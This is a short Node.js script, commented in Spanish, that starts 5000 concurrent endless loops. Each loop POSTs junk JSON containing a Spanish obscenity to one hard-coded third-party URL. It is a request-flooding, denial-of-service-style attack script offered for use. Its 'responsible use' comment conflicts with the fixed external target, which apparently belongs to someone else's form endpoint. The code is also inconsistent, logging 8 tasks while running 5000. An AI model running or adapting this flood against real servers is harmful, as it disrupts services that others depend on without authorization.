// Uso responsable: sólo para pruebas en tu propio endpoint o con permiso.
const axios = require('axios');

const URL = 'https://472co.lat/ShvnVrzgWH/api/input?token=6c8b869-d16b-4a7b-8651-1c16aade3e27X'; // usar tu staging
let sent = 0;

async function sendOnce(index) {
    try {
        const resp = await axios.post(URL, {
        "content": {
            "type": "input_address",
            "key": "address",
            "text": "la-puta-que-los-pario"
        },
        "timestamp": 1762271823134
        });

        console.log(`Hilo: ${index} - OK ${sent}: ${resp.status}`);
    } catch (err) {
        if (err.response) {
        console.warn(`ERR ${sent}: HTTP ${err.response.status}`);
        } else {
        console.warn(`ERR ${sent}:`, err.message);
        }
    }
}

async function run(index) {
    while (true) {
        await sendOnce(index);
        sent++;
    }
  console.log('Prueba finalizada.');
}

async function runOnceParallel8() {
  const tasks = Array.from({ length: 5000 }, (_, i) => run(i));
  try {
    const results = await Promise.all(tasks);
    console.log('Los 8 terminaron. Estados:', results.map(r => r.status));
  } catch (err) {
    console.warn('Al menos una petición falló:', err.message || err);
  }
}

runOnceParallel8();

// run();
